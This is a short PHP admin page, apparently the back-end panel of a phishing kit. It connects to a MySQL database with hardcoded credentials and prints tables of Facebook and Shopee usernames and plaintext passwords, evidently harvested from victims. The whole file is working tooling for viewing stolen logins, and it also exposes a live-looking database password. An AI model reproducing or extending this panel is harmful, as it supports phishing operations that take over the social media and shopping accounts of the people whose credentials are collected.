<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trang admin</title>
    <style>
        td, th{
            border:1px solid black;
            padding: 20px
        }
        .facebook{
            color:#0E8EF1;
        }t
        .shopee{
            color:#f53d2d;
        }
    </style>
</head>
<body>
    <div class="container">
        <table>
            <tr class="facebook">
                <td>STT</td>
                <th>Tài khoản fb</th>
                <th>Mật khẩu fb</th>
            </tr>
            <?php
                $conn = new mysqli('localhost', 'id17959450_quan123', '?A2R]NULR0#%$!j8', 'id17959450_quan');

                $sql = "SELECT * FROM facebook";
                $reusult = $conn->query($sql);

                $stt = 1;
                while($row = $reusult->fetch_assoc()){
                    echo
                    "<tr>
                        <td>".$stt++."</td>
                        <th>".$row['name']."</th>
                        <th>".$row['password']."</th>
                    </tr>";
                }
            ?>
        </table>
        <table>
            <tr class="shopee">
                <td>STT</td>
                <th>Tài khoản shopee</th>
                <th>Mật khẩu shopee</th>
            </tr>
            <?php
                $conn = new mysqli('localhost', 'id17959450_quan123', '?A2R]NULR0#%$!j8', 'id17959450_quan');

                $sql = "SELECT * FROM shopee";
                $reusult = $conn->query($sql);

                $stt = 1;
                while($row = $reusult->fetch_assoc()){
                    echo
                    "<tr>
                        <td>".$stt++."</td>
                        <th>".$row['name']."</th>
                        <th>".$row['password']."</th>
                    </tr>";
                }
            ?>
        </table>
    </div>
</body>
</html>